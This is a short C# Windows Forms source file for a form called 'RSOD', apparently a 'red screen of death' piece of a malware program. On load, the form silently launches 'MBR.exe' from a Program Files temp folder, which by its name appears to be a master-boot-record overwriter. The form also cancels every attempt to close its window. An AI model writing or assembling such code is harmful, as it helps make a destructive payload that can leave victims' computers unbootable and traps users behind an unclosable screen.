using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;

namespace RSOD
{
    public partial class RSOD : Form
    {
        public RSOD()
        {
            InitializeComponent();
        }

        private void RSOD_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private void RSOD_Load(object sender, EventArgs e)
        {
           try
            {
                string mbr = @"C:\Program Files\Temp\MBR.exe";
                if (File.Exists(mbr))
                {
                    Process.Start(mbr);
                }
            }
            catch
            {

            }
        }
    }
}
